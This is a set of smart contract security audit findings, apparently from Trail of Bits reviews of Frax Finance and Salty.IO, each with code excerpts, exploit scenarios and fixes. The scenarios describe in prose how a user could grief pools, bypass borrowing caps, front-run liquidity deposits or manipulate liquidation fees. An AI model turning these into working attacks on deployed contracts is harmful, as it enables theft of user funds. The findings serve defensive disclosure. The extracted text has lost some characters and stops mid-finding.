[{"title": "1. Risk of unexpected results when long-term swaps involving rebasing tokens are canceled ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/FraxQ22022.pdf", "body": "FraxSwaps use of rebasing tokenstokens whose supply can be adjusted to control their pricescould cause transactions to revert after users cancel or withdraw from long-term swaps. FraxSwap oers a new type of swap called a long-term swap, which executes certain swaps over an extended period of time. Users can cancel or withdraw from long-term swaps and recover all of their purchased and unsold tokens. ///@notice stop the execution of a long term order function cancelLongTermSwap(uint256 orderId) external lock execVirtualOrders { (address sellToken, uint256 unsoldAmount, address buyToken, uint256 purchasedAmount) = longTermOrders.cancelLongTermSwap(orderId); bool buyToken0 = buyToken == token0; twammReserve0 -= uint112(buyToken0 ? purchasedAmount : unsoldAmount); twammReserve1 -= uint112(buyToken0 ? unsoldAmount : purchasedAmount); // transfer to owner of order _safeTransfer(buyToken, msg.sender, purchasedAmount); _safeTransfer(sellToken, msg.sender, unsoldAmount); // update order. Used for tracking / informational longTermOrders.orderMap[orderId].isComplete = true; emit CancelLongTermOrder(msg.sender, orderId, sellToken, unsoldAmount, buyToken, purchasedAmount); } Figure 1.1: The cancelLongTermSwap function in the UniV2TWAMMPair contract However, if a rebasing token is used in a long-term swap, the balance of the UniV2TWAMMPair contract could increase or decrease over time. Such changes in the contracts balance could result in unintended eects when users try to cancel or withdraw from long-term swaps. For example, because all long-term swaps for a pair are processed as part of any function with the execVirtualOrders modier, if the actual balance of the UniV2TWAMMPair is reduced as part of one or more rebases in the underlying token, this balance will not be reected correctly in the contracts internal accounting, and cancel and withdraw operations will transfer too many tokens to users. Eventually, this will exhaust the contracts balance of the token before all users are able to withdraw, causing these transactions to revert. Exploit Scenario Alice creates a long-term swap; one of the tokens to be swapped is a rebasing token. After some time, the tokens supply is adjusted, causing the balance of UniV2TWAMMPair to decrease. Alice tries to cancel the long-term swap, but the internal bookkeeping for her swap was not updated to reect the rebase, causing the token transfer from the contract to Alice to revert and blocking her other token transfers from completing. To allow Alice to access funds and to allow subsequent transactions to succeed, some tokens need to be explicitly sent to the UniV2TWAMMPair contract to increase its balance. Recommendations Short term, explicitly document issues involving rebasing tokens and long-term swaps to ensure that users are aware of them. Long term, evaluate the security risks surrounding ERC20 tokens and how they could aect every system component. References  Common errors with rebasing tokens on Uniswap V2", "labels": ["Trail of Bits", "Severity: High", "Difficulty: High"]}, {"title": "2. Missing liquidity checks when initiating long-term swaps ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/FraxQ22022.pdf", "body": "When a long-term swap is submitted to a UniV2TWAMMPair instance, the code performs checks, such as those ensuring that the selling rate of a given token is nonzero, before the order is recorded. However, the code does not validate the existing reserves for the tokens being bought in long-term swaps. ///@notice adds long term swap to order pool function performLongTermSwap(LongTermOrders storage longTermOrders, address from, address to, uint256 amount, uint256 numberOfTimeIntervals) private returns (uint256) { // make sure to update virtual order state (before calling this function) //determine the selling rate based on number of blocks to expiry and total amount uint256 currentTime = block.timestamp; uint256 lastExpiryTimestamp = currentTime - (currentTime % longTermOrders.orderTimeInterval); uint256 orderExpiry = longTermOrders.orderTimeInterval * (numberOfTimeIntervals + 1) + lastExpiryTimestamp; uint256 sellingRate = SELL_RATE_ADDITIONAL_PRECISION * amount / (orderExpiry - currentTime); require(sellingRate > 0); // tokenRate cannot be zero Figure 2.1: Uniswap_V2_TWAMM/twamm/LongTermOrders.sol#L118-L128 If a long-term swap is submitted before adequate liquidity has been added to the pool, the next pool operation will attempt to trade against inadequate liquidity, resulting in a division-by-zero error in the line highlighted in blue in gure 2.2. As a result, all pool operations will revert until the number of tokens needed to begin executing the virtual swap are added. ///@notice computes the result of virtual trades by the token pools function computeVirtualBalances( uint256 token0Start, uint256 token1Start, uint256 token0In, uint256 token1In) internal pure returns (uint256 token0Out, uint256 token1Out, uint256 ammEndToken0, uint256 ammEndToken1) { token0Out = 0; token1Out = 0; //when both pools sell, we use the TWAMM formula else { uint256 aIn = token0In * 997 / 1000; uint256 bIn = token1In * 997 / 1000; uint256 k = token0Start * token1Start; ammEndToken1 = token0Start * (token1Start + bIn) / (token0Start + aIn); ammEndToken0 = k / ammEndToken1; token0Out = token0Start + aIn - ammEndToken0; token1Out = token1Start + bIn - ammEndToken1; } Figure 2.2: Uniswap_V2_TWAMM/twamm/ExecVirtualOrders.sol#L39-L78 The long-term swap functionality can be paused by the contract owner (e.g., to prevent long-term swaps when a pool has inadequate liquidity); however, by default, the functionality is enabled when a new pool is deployed. An attacker could exploit this fact to grief a newly deployed pool by submitting long-term swaps early in its lifecycle when it has minimal liquidity. Additionally, even if a newly deployed pool is already loaded with adequate liquidity, a user could submit long-term swaps with zero intervals to trigger an integer underow in the line highlighted in red in gure 2.2. However, note that the user would have to submit at least one long-term swap that requires more than the total liquidity in the reserve: testSync(): failed! Call sequence:     initialize(6809753114178753104760,5497681857357274469621,837982930770660231771 7,10991961728915299510446) longTermSwapFrom1To0(2,0) testLongTermSwapFrom0To1(23416246225666705882600004967801889944504351201487667 6541160061227714669,0) testSync() Time delay: 37073 seconds Block delay: 48 Figure 2.3: The Echidna output that triggers a revert in a call to sync() Exploit Scenario A new FraxSwap pool is deployed, causing the long-term swap functionality to be unpaused. Before users have a chance to add sucient liquidity to the pool, Eve initiates long-term swaps in both directions. Since there are no tokens available to purchase, all pool operations revert, and the provided tokens are trapped. At this point, adding more liquidity is not possible since doing so also triggers the long-term swap computation, forcing a revert. Recommendations Short term, disable new swaps and remove all the liquidity in the deployed contracts. Modify the code so that, moving forward, liquidity can be added without executing long-term swaps. Document the pool state requirements before long-term swaps can be enabled. Long term, use extensive smart contract fuzzing to test that important operations cannot be blocked.", "labels": ["Trail of Bits", "Severity: High", "Difficulty: High"]}, {"title": "3. Missing events in several contracts ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/FraxQ22022.pdf", "body": "An insucient number of events is declared in the Frax Finance contracts. As a result, malfunctioning contracts or malicious attacks may not be noticed. For instance, long-term swaps are executed in batches by the executeVirtualOrdersUntilTimestamp function: ///@notice executes all virtual orders until blockTimestamp is reached. function executeVirtualOrdersUntilTimestamp(LongTermOrders storage longTermOrders, uint256 blockTimestamp, ExecuteVirtualOrdersResult memory reserveResult) internal { uint256 nextExpiryBlockTimestamp = longTermOrders.lastVirtualOrderTimestamp - (longTermOrders.lastVirtualOrderTimestamp % longTermOrders.orderTimeInterval) + longTermOrders.orderTimeInterval; //iterate through time intervals eligible for order expiries, moving state forward OrderPool storage orderPool0 = longTermOrders.OrderPool0; OrderPool storage orderPool1 = longTermOrders.OrderPool1; while (nextExpiryBlockTimestamp < blockTimestamp) { // Optimization for skipping blocks with no expiry if (orderPool0.salesRateEndingPerTimeInterval[nextExpiryBlockTimestamp] > 0 || orderPool1.salesRateEndingPerTimeInterval[nextExpiryBlockTimestamp] > 0) { //amount sold from virtual trades uint256 blockTimestampElapsed = nextExpiryBlockTimestamp - longTermOrders.lastVirtualOrderTimestamp; uint256 token0SellAmount = orderPool0.currentSalesRate * blockTimestampElapsed / SELL_RATE_ADDITIONAL_PRECISION; uint256 token1SellAmount = orderPool1.currentSalesRate * blockTimestampElapsed / SELL_RATE_ADDITIONAL_PRECISION; (uint256 token0Out, uint256 token1Out) = executeVirtualTradesAndOrderExpiries(reserveResult, token0SellAmount, token1SellAmount); orderPool1, token0Out, token1Out, nextExpiryBlockTimestamp); updateOrderPoolAfterExecution(longTermOrders, orderPool0, } nextExpiryBlockTimestamp += longTermOrders.orderTimeInterval; } //finally, move state to current blockTimestamp if necessary if (longTermOrders.lastVirtualOrderTimestamp != blockTimestamp) { //amount sold from virtual trades uint256 blockTimestampElapsed = blockTimestamp - longTermOrders.lastVirtualOrderTimestamp; uint256 token0SellAmount = orderPool0.currentSalesRate * blockTimestampElapsed / SELL_RATE_ADDITIONAL_PRECISION; uint256 token1SellAmount = orderPool1.currentSalesRate * blockTimestampElapsed / SELL_RATE_ADDITIONAL_PRECISION; (uint256 token0Out, uint256 token1Out) = executeVirtualTradesAndOrderExpiries(reserveResult, token0SellAmount, token1SellAmount); updateOrderPoolAfterExecution(longTermOrders, orderPool0, orderPool1, token0Out, token1Out, blockTimestamp); } } Figure 3.1: Uniswap_V2_TWAMM/twamm/LongTermOrders.sol#L216-L252 However, despite the complexity of this function, it does not emit any events; it will be dicult to monitor issues that may arise whenever the function is executed. Additionally, important operations in the FPIControllerPool and CPITrackerOracle contracts do not emit any events: function toggleMints() external onlyByOwnGov { mints_paused = !mints_paused; } function toggleRedeems() external onlyByOwnGov { redeems_paused = !redeems_paused; } function setFraxBorrowCap(int256 _frax_borrow_cap) external onlyByOwnGov { frax_borrow_cap = _frax_borrow_cap; } function setMintCap(uint256 _fpi_mint_cap) external onlyByOwnGov { fpi_mint_cap = _fpi_mint_cap; } Figure 3.2: FPI/FPIControllerPool.sol#L528-L542 Events generated during contract execution aid in monitoring, baselining of behavior, and detection of suspicious activity. Without events, users and blockchain-monitoring systems cannot easily detect behavior that falls outside the baseline conditions, and it will be dicult to review the correct behavior of the contracts once they have been deployed. Exploit Scenario Eve, a malicious user, discovers a vulnerability that allows her to manipulate long-term swaps. Because no events are generated from her actions, the attack goes unnoticed. Eve uses her exploit to drain liquidity or prevent other users from swapping before the Frax Finance team has a chance to respond. Recommendations Short term, emit events for all operations that may contribute to a higher level of monitoring and alerting, even internal ones. Long term, consider using a blockchain-monitoring system to track any suspicious behavior in the contracts. A monitoring mechanism for critical events could quickly detect system compromises.", "labels": ["Trail of Bits", "Severity: Low", "Difficulty: Low"]}, {"title": "4. Unsafe integer conversions in FPIControllerPool ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/FraxQ22022.pdf", "body": "Explicit integer conversions can be used to bypass certain restrictions (e.g., the borrowing cap) in the FPIControllerPool contract. The FPIControllerPool contract allows certain users to either borrow or repay FRAX within certain limits (e.g., the borrowing cap): // Lend the FRAX collateral to an AMO function giveFRAXToAMO(address destination_amo, uint256 frax_amount) external onlyByOwnGov validAMO(destination_amo) { int256 frax_amount_i256 = int256(frax_amount); // Update the balances first require((frax_borrowed_sum + frax_amount_i256) <= frax_borrow_cap, \"Borrow frax_borrowed_balances[destination_amo] += frax_amount_i256; frax_borrowed_sum += frax_amount_i256; // Give the FRAX to the AMO TransferHelper.safeTransfer(address(FRAX), destination_amo, frax_amount); cap\"); } // AMO gives back FRAX. Needed for proper accounting function receiveFRAXFromAMO(uint256 frax_amount) external validAMO(msg.sender) { int256 frax_amt_i256 = int256(frax_amount); // Give back first TransferHelper.safeTransferFrom(address(FRAX), msg.sender, address(this), frax_amount); // Then update the balances frax_borrowed_balances[msg.sender] -= frax_amt_i256; frax_borrowed_sum -= frax_amt_i256; } Figure 4.1: The giveFRAXToAMO function in FPIControllerPool.sol However, these functions explicitly convert these variables from uint256 to int256; these conversions will never revert and can produce unexpected results. For instance, if frax_amount is set to a very large unsigned integer, it could be cast to a negative number. Malicious users could exploit this fact by adjusting the variables to integers that will bypass the limits imposed by the code after they are cast. The same issue aects the implementation of price_info: // Get additional info about the peg status function price_info() public view returns ( int256 collat_imbalance, uint256 cpi_peg_price, uint256 fpi_price, uint256 price_diff_frac_abs ) { fpi_price = getFPIPriceE18(); cpi_peg_price = cpiTracker.currPegPrice(); uint256 fpi_supply = FPI_TKN.totalSupply(); if (fpi_price > cpi_peg_price){ collat_imbalance = int256(((fpi_price - cpi_peg_price) * fpi_supply) / PRICE_PRECISION); price_diff_frac_abs = ((fpi_price - cpi_peg_price) * PEG_BAND_PRECISION) / fpi_price; } else { collat_imbalance = -1 * int256(((cpi_peg_price - fpi_price) * fpi_supply) / PRICE_PRECISION); price_diff_frac_abs = ((cpi_peg_price - fpi_price) * PEG_BAND_PRECISION) / fpi_price; } } Figure 4.2: The price_info function in FPIControllerPool.sol Exploit Scenario Eve submits a governance proposal that can increase the amount of FRAX that can be borrowed. The voters approve the proposal because they believe that the borrowing cap will stop Eve from changing it to a larger value. Recommendations Short term, add checks to the relevant functions to validate the results of explicit integer conversions to ensure that they are within the expected range. Long term, use extensive smart contract fuzzing to test that system invariants cannot be broken.", "labels": ["Trail of Bits", "Severity: High", "Difficulty: High"]}, {"title": "5. leveragedPosition and repayAssetWithCollateral do not update the exchangeRate ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/FraxQ22022.pdf", "body": "Some FraxLend functions do not update the exchange rate, allowing insolvent users to call them. The FraxLend platform oers various operations, such as leveragedPosition and repayAssetWithCollateral, for users to borrow funds as long as they are solvent. The solvency check is implemented by the isSolvent modier, which runs at the end of such operations: /// @notice Checks for solvency AFTER executing contract code /// @param _borrower The borrower whose solvency we will check modifier isSolvent(address _borrower) { _; require(_isSolvent(_borrower, exchangeRateInfo.exchangeRate), \"FraxLendPair: user is insolvent\"); } Figure 5.1: The isSolvent modier in the FraxLendCore contract However, this modier is not enough to ensure solvency since the exchange rate changes over time, which can make previously solvent users insolvent. That is why it is important to force an update of the exchange rate during any operation that allows users to borrow funds: function updateExchangeRate() public returns (uint256 _exchangeRate) { ExchangeRateInfo memory _exchangeRateInfo = exchangeRateInfo; if (_exchangeRateInfo.lastTimestamp == block.timestamp) return _exchangeRate = _exchangeRateInfo.exchangeRate;  // write to storage _exchangeRateInfo.exchangeRate = uint224(_exchangeRate); _exchangeRateInfo.lastTimestamp = uint32(block.timestamp); exchangeRateInfo = _exchangeRateInfo; emit UpdateExchangeRate(_exchangeRate); } Figure 5.2: Part of the updateExchangeRate function in the FraxLendCore contract However, the leveragedPosition and repayAssetWithCollateral operations increase the debt of the caller but do not call updateExchangeRate; therefore, they will perform the solvency check with old information. Exploit Scenario Eve, a malicious user, notices a drop in the collateral price. She calls leveragedPosition or repayAssetWithCollateral to borrow more than the amount of shares/collateral she should be able to. Recommendations Short term, add a call to updateExchangeRate in every function that increases users debt. Long term, document the invariants and preconditions for every function and use extensive smart contract fuzzing to test that system invariants cannot be broken.", "labels": ["Trail of Bits", "Severity: High", "Difficulty: Low"]}, {"title": "6. Risk of hash collisions in FraxLendPairDeployer that could block certain deployments ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/FraxQ22022.pdf", "body": "A hash collision could occur in the FraxLendPairDeployer contract, allowing unauthenticated users to block the deployment of certain contracts from authenticated users. The FraxLendPairDeployer contract allows any user to deploy certain contracts using the deploy function, which creates a contract name based on certain parameters: function deploy( address _asset, address _collateral, address _oracleTop, address _oracleDiv, uint256 _oracleNormalization, address _rateContract, bytes calldata _rateInitCallData ) external returns (address _pairAddress) { string memory _name = string( abi.encodePacked( \"FraxLendV1-\", IERC20(_collateral).safeName(), \"/\", IERC20(_asset).safeName(), \" - \", IRateCalculator(_rateContract).name(), \" - \", deployedPairsArray.length + 1 ) );  Figure 6.1: The header of the deploy function in the FraxLendPairDeployer contract The _deploySecond function creates a hash of this contract name and checks it to ensure that it has not already been deployed: function _deploySecond( string memory _name, address _pairAddress, address _asset, address _collateral, uint256 _maxLTV, uint256 _liquidationFee, address _oracleTop, address _oracleDiv, uint256 _oracleNormalization, address _rateContract, bytes memory _rateInitCallData, address[] memory _approvedBorrowers, address[] memory _approvedLenders ) private {  bytes32 _nameHash = keccak256(bytes(_name)); require(deployedPairsByName[_nameHash] == address(0), \"FraxLendPairDeployer: Pair name must be unique\"); deployedPairsByName[_nameHash] = _pairAddress;  Figure 6.2: Part of the _deploySecond function in the FraxLendPairDeployer contract Both authenticated and unauthenticated users can use this code to deploy contracts, but only authenticated users can select any name for contracts they want to deploy. Additionally, the _deployFirst function computes a salt based on certain parameters: function _deployFirst( address _asset, address _collateral, uint256 _maxLTV, uint256 _liquidationFee, address _oracleTop, address _oracleDiv, uint256 _oracleNormalization, address _rateContract, bytes memory _rateInitCallData, bool _isBorrowerWhitelistActive, bool _isLenderWhitelistActive ) private returns (address _pairAddress) { { //clones are distinguished by their data bytes32 salt = keccak256( abi.encodePacked( _asset, _collateral, _maxLTV, _liquidationFee, _oracleTop, _oracleDiv, _oracleNormalization, _rateContract, _rateInitCallData, _isBorrowerWhitelistActive, _isLenderWhitelistActive ) ); require(deployedPairsBySalt[salt] == address(0), \"FraxLendPairDeployer: Pair already deployed\");  Figure 6.3: The header of the _deployFirst function in the FraxLendPairDeployer contract Again, both authenticated and unauthenticated users can use this code, but some parameters are xed for unauthorized users (e.g., _maxLTV will always be DEFAULT_MAX_LTV and cannot be changed). However, in both cases, a hash collision could block contracts from being deployed. For example, if an unauthenticated user sees an authenticated users pending transaction to deploy a contract, he could deploy his own contract with a name or parameters that result in a hash collision, preventing the authenticated users contract from being deployed. Exploit Scenario Alice, an authenticated user, starts a custom deployment with certain parameters. Eve, a malicious user, sees Alices unconrmed transactions and front-runs them with her own call to deploy a contract with similar parameters. Eves transaction succeeds, causing Alices deployment to fail and forcing her to change either the contracts name or the parameters of the call to deploy. Recommendations Short term, prevent collisions between dierent types of deployments. Long term, review the permissions and capabilities of authenticated and unauthenticated users in every component.", "labels": ["Trail of Bits", "Severity: Medium", "Difficulty: High"]}, {"title": "1. Risk of denial-of-service attacks on token whitelisting process ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-10-saltyio-securityreview.pdf", "body": "The token whitelisting process can be disrupted by a malicious user submitting spurious proposals. The proposeTokenWhitelisting function allows users to submit proposals for adding new tokens to the whitelist. If the requirements are met, it creates a unique proposal and includes it in the pending whitelisting proposals list. 121 function proposeTokenWhitelisting( IERC20 token, string memory tokenIconURL, string memory description ) public nonReentrant 122 123 124 125 { require( address(token) != address(0), \"token cannot be address(0)\" ); require( _openBallotsForTokenWhitelisting.length() < daoConfig.maxPendingTokensForWhitelisting(), \"The maximum number of token whitelisting proposals are already pending\" ); 126 require( poolsConfig.numberOfWhitelistedPools() < poolsConfig.maximumWhitelistedPools(), \"Maximum number of whitelisted pools already reached\" ); 127 require( ! poolsConfig.tokenHasBeenWhitelisted(token, exchangeConfig.wbtc(), exchangeConfig.weth()), \"The token has already been whitelisted\" ); 128 129 string memory ballotName = string.concat(\"whitelist:\", Strings.toHexString(address(token)) ); 130 131 uint256 ballotID = _possiblyCreateProposal( ballotName, BallotType.WHITELIST_TOKEN, address(token), 0, tokenIconURL, description, 2 * daoConfig.baseProposalCost() ); 132 133 _openBallotsForTokenWhitelisting.add( ballotID ); } Figure 1.1: src/dao/Proposals.sol#L121-L133 17 Salty.IO Security Assessment However, the maximum number of queueable token whitelisting proposals is currently capped at ve, which can be extended to a maximum of 12. This presents a potential vulnerability to denial-of-service attacks, as a malicious actor could persistently submit meaningless tokens to saturate the queue, thereby preventing legitimate token whitelisting proposals. 49 time. 50 51 // The maximum number of tokens that can be pending for whitelisting at any // Range: 3 to 12 with an adjustment of 1 uint256 public maxPendingTokensForWhitelisting = 5; Figure 1.2: src/dao/DAOConfig.sol#L49-L51 Furthermore, since voters may lack incentive to downvote these fraudulent proposals, the required quorum may never be reached to nalize the ballot, eectively blocking the service for an extended duration. Submitting a proposal requires a nonrefundable fee that is currently set at $500, which should prevent most frivolous attackers. However, this will not stop a motivated, well-funded attacker such as a competitor. Exploit Scenario When the Salty.IO protocol is deployed, Eve submits multiple proposals to whitelist fake tokens. These proposals ll up the queue, eectively obstructing the inclusion of genuine token whitelisting proposals in the queue. Once the protocol is able to get a quorum to remove one of the proposals, Eves bot immediately back runs the transaction with another proposal. Recommendations Short term, implement a mechanism that allows an authorized entity to remove undesirable or unwanted token whitelisting proposals from the queue of proposals. Alternatively, implement a larger sized deposit that would be returned to a legitimate proposer. Long term, review critical codebase operations to ensure consistent and comprehensive logging of essential information, promoting transparency, troubleshooting, and ecient system management. 18 Salty.IO Security Assessment 2. Insu\u0000cient event generation Severity: Informational Diculty: Low Type: Auditing and Logging Finding ID: TOB-SALTY-2 Target: src/*", "labels": ["Trail of Bits", "Severity: High", "Difficulty: Medium"]}, {"title": "3. Transactions to add liquidity may be front run ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-10-saltyio-securityreview.pdf", "body": "Even with a properly set slippage guard, a depositor calling addLiquidity can be front run by a sole liquidity holder, which would cause the depositor to lose funds. When either of the reserves of a pool is less than the dust (100 wei), any call to addLiquidity will cause the pool to reset the reserves ratio. // If either reserve is less than dust then consider the pool to be empty and that the added liquidity will become the initial token ratio if ( ( reserve0 <= PoolUtils.DUST ) || ( reserve1 <= PoolUtils.DUST ) ) { // Update the reserves reserves.reserve0 += maxAmountA; reserves.reserve1 += maxAmountB; return ( maxAmountA, maxAmountB, Math.sqrt(maxAmountA * maxAmountB) ); } Figure 3.1: src/pools/Pools.sol#L112-L120 Exploit Scenario Eve is the sole liquidity holder in the WETH/DAI pool, which has reserves of 100 WETH and 200,000 DAI, for a ratio of 1:2,000. 1. Alice submits a transaction to add 10 WETH and 20,000 DAI of liquidity. 2. Eve front runs Alices transaction with a removeLiquidity transaction that brings one of the reserves down to close to zero. 3. As the last action of her transaction, Eve adds liquidity, but because one of the reserves is close to zero, whatever ratio she adds to the pool becomes the new reserves ratio. In this example, Eve adds the ratio 10:2,000 (representing a WETH price of 200 DAI). 4. Alices addLiquidity transaction goes through, but because of the new K ratio, the logic lets her add only 10 WETH and 2,000 DAI. The liquidity slippage guard does not 20 Salty.IO Security Assessment work because the reserves ratio has been reset. In nominal terms, Alice actually receives more liquidity than she would have at the previous ratio. 5. Eve back runs this transaction with a swap transaction that buys most of the WETH that Alice just deposited for a starting price of 200 DAI. Eve then removes her liquidity, eectively stealing Alices 10 WETH for a fraction of the price. Recommendations Short term, add a mechanism to prevent reserves from dropping below dust levels. Long term, carefully assess invariants and situations in which front-running may aect functionality. Invariant testing would be useful for this. 21 Salty.IO Security Assessment", "labels": ["Trail of Bits", "Severity: High", "Difficulty: High"]}, {"title": "4. Whitelisted pools may exceed the maximum allowed ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-10-saltyio-securityreview.pdf", "body": "The number of whitelisted pools may exceed the maximum number allowed because there is no check against the current length of whitelistedPools when the maximum number of whitelistedPools is decreased via a proposal. function changeMaximumWhitelistedPools(bool increase) public onlyOwner { if (increase) { if (maximumWhitelistedPools < 100) maximumWhitelistedPools += 10; } else { if (maximumWhitelistedPools > 20) maximumWhitelistedPools -= 10; } } Figure 4.1: src/pools/PoolsConfig.sol#L59-L72 Exploit Scenario The current maximumWhitelistedPools is set to 20, and the current number of whitelisted pools is 20. A proposal that decreases the maximum number of pools to 10 is approved, so maximumWhitelistedPools becomes 10. There are three other proposals to whitelist new tokens, which all pass, creating six new whitelisted pools. This brings the total number of whitelisted pools to 26, while the maximum is 10. In order to add a new whitelisted pool, two new proposals must pass that each increase the maximum by 10. Recommendations Short term, add a check of the current number of pools and the number of proposals for adding new tokens; the check should run before the maximum is changed and before proposals to whitelist tokens are accepted. Long term, design a specication that identies the boundaries for all parameters along with requirements as to how situations such as these should be handled. 22 Salty.IO Security Assessment", "labels": ["Trail of Bits", "Severity: Low", "Difficulty: High"]}, {"title": "5. Any user can add liquidity to any pool and bypass the token whitelist ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-10-saltyio-securityreview.pdf", "body": "The absence of token whitelist checks within the addLiquidity function allows any user to create trading pairs, including pairs with malicious tokens, and to provide liquidity for arbitrary token pairs. This vulnerability may expose the protocol to potential reentrancy attacks, thereby resulting in the potential loss of funds for users who provide liquidity for the pool. Furthermore, the lack of authorization checks on this function allows users from blacklisted regions to directly call addLiquidity on a pool, bypassing the AccessManager access control and associated geolocation check. // Add liquidity for the specified trading pair (must be whitelisted) function addLiquidity( IERC20 tokenA, IERC20 tokenB, uint256 maxAmountA, uint256 maxAmountB, uint256 minLiquidityReceived, uint256 deadline ) public nonReentrant ensureNotExpired(deadline) returns (uint256 addedAmountA, uint256 addedAmountB, uint256 addedLiquidity) { require( exchangeConfig.initialDistribution().bootstrapBallot().startExchangeApproved(), \"The exchange is not yet live\" ); require( address(tokenA) != address(tokenB), \"Cannot add liquidity for duplicate tokens\" ); Figure 5.1: The addLiquidity function for the Liquidity contract (src/pools/Pools.sol#L149-L177) Exploit Scenario Alice creates a trading pair using a malicious token. The malicious token pair allows attackers to perform reentrancy attacks and to steal funds from Alice, who provides liquidity in the associated pool. Recommendations Short term, add the appropriate token whitelist and user authorization checks to the addLiquidity function. Long term, review critical operations in the codebase and ensure that proper access control mechanisms are put in place. 23 Salty.IO Security Assessment", "labels": ["Trail of Bits", "Severity: Medium", "Difficulty: Low"]}, {"title": "6. Liquidation fee is volatile and may be manipulated ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-10-saltyio-securityreview.pdf", "body": "The liquidation reward is intended to be 5% of the liquidity seized, but in actuality, it may range from close to 0% to close to 10%. The Salty.IO liquidation process is straightforward. When the loan-to-value (LTV) ratio of a loan drops below the threshold, liquidateUser may be called by anyone, and it will immediately liquidate the loan by removing the liquidity, seizing the WBTC and WETH, and paying a fee to the caller. The fee is intended to be 5% of the amount liquidated, which is estimated as 10% of the WETH seized. This assumes the WETH and WBTC will be equal in value. However, due to market forces, the actual ratio of values will diverge from 50:50 even if that was the ratio of the values of the initial deposit. // Liquidate a position which has fallen under the minimum collateral ratio. // A default 5% of the value of the collateral is sent to the caller, with the rest being sent to the Liquidator for later conversion to USDS which is then burned. function liquidateUser( address wallet ) public nonReentrant  // The caller receives a default 5% of the value of the liquidated collateral so we can just send them default 10% of the reclaimedWETH (as WBTC/WETH is a 50/50 pool). uint256 rewardedWETH = (2 * reclaimedWETH * stableConfig.rewardPercentForCallingLiquidation()) / 100;  // Reward the caller weth.safeTransfer( msg.sender, rewardedWETH ); Figure 6.1: src/stable/Collateral.sol#L144-L184 The value of WETH can be further manipulated by sandwiching a call to liquidateUser with a WBTC/WETH swap transaction, which could push the reserves of either token to 24 Salty.IO Security Assessment close to the dust amount. This could double the amount of WETH received by the liquidator; alternatively, it could reduce the amount of WETH to almost zero. Users who want to add liquidity, called LPs, and participate in LP staking rewards are expected to call the Liquidity contract; however, a user could also call addLiquidity directly on a pool, bypassing the AccessManager access control and associated geolocation check. Furthermore, a user may believe that by doing so they will participate in the arbitrage prot rewards, but in fact, they will not. Exploit Scenario Alice takes out a loan of USDS against her WBTC/WETH. Subsequently, Eve notices the LTV of the loan is below the threshold. She submits a transaction: 1. It rst swaps WETH for a signicant amount of WBTC from the collateral pool. 2. It then calls liquidateUser, and due to the estimate based on WETH, Alice receives signicantly more WETH than she was entitled to. 3. Finally, it unwinds the swap from step 1. Recommendations Short term, instead of estimating the fee as two times the WETH amount, have the liquidateUser function send the exact amount of WETH and WBTC to the liquidator. Long term, create a specication for all major workows with clear denitions and expectations for each process. 25 Salty.IO Security Assessment", "labels": ["Trail of Bits", "Severity: Medium", "Difficulty: Low"]}, {"title": "7. Collateral contract deployment results in permanent loss of rewards ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-10-saltyio-securityreview.pdf", "body": "Anyone who provides liquidity to the collateral pool (also known as the WETH/WBTC pool) will not earn rewards, and any arbitrage prots allocated to the pool will be permanently lost. The Collateral contract is deployed separately from the Liquidity contract; however, only liquidity in the Liquidity contract can claim rewards. This arises because the Liquidity contract is the sole contract seeded with SALT rewards. As shown in gure 7.1, the performUpkeep function, which is responsible for sending rewards to the relevant contract, references only stakingRewards, which is congured as the address of the Liquidity contract; it completely overlooks the Collateral contract. This means that rewards intended for the collateral pool are misdirected, as they should properly be sent to the Collateral contract. // Transfer a percent (default 1% per day) of the currently held rewards to the specified StakingRewards pools. // The percentage to transfer is interpolated from how long it's been since the last performUpkeep(). function performUpkeep( uint256 timeSinceLastUpkeep, bool isStaking ) public  // Add the rewards so that they can later be claimed by the users proportional to their share of the StakingRewards derived contract( Staking, Liquidity or Collateral) stakingRewards.addSALTRewards( addedRewards ); } Figure 7.1: In the above code, stakingRewards refers to the Liquidity contract. (src/rewards/RewardsEmitter.sol#L80-L138) If an actual collateral pool liquidity holder calls claimAllRewards on the Collateral contract, then it will revert because there are no rewards in the contract. If the user calls 26 Salty.IO Security Assessment claimAllRewards on the Liquidity contract, it will revert because the user has no liquidity as far as the Liquidity contract is concerned. Exploit Scenario The protocol is deployed, and Alice adds liquidity to the collateral pool. Over time, the pool accumulates arbitrage fees. Alice is unable to claim any rewards, and the rewards that are sent to the pool are permanently lost. Recommendations Short term, combine the Liquidity and Collateral contracts into one. Long term, create a specication for all contracts with clear denitions and expectations for each process. 27 Salty.IO Security Assessment", "labels": ["Trail of Bits", "Severity: High", "Difficulty: Low"]}, {"title": "8. Collateral can be withdrawn without repaying USDS loan ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-10-saltyio-securityreview.pdf", "body": "Users could bypass collateralization checks and reclaim their collateral assets without repaying their USDS loans. The withdrawCollateralAndClaim function withdraws WBTC/WETH collateral assets and sends any pending rewards to the caller. It includes checks to ensure that, after the withdrawal, the caller will still possess sucient collateral in the form of liquidity shares to maintain any outstanding loans before initiating the withdrawal of WBTC and WETH liquidity from the pool and sending the reclaimed tokens back to the user. 81 function withdrawCollateralAndClaim( uint256 collateralToWithdraw, uint256 minReclaimedWBTC, uint256 minReclaimedWETH, uint256 deadline ) public returns (uint256 reclaimedWBTC, uint256 reclaimedWETH) 82 83 { // Make sure that the user has collateral and if they have borrowed USDS that collateralToWithdraw doesn't bring their collateralRatio below allowable levels. 84 require( userShareForPool( msg.sender, collateralPoolID ) > 0, \"User does not have any collateral\" ); 85 require( collateralToWithdraw <= maxWithdrawableCollateral(msg.sender), \"Excessive collateralToWithdraw\" ); 86 87 // Withdraw the WBTC/WETH liquidity from the liquidity pool (sending the reclaimed tokens back to the user) 88 (reclaimedWBTC, reclaimedWETH) = withdrawLiquidityAndClaim( wbtc, weth, collateralToWithdraw, minReclaimedWBTC, minReclaimedWETH, deadline ); 89 } Figure 8.1: 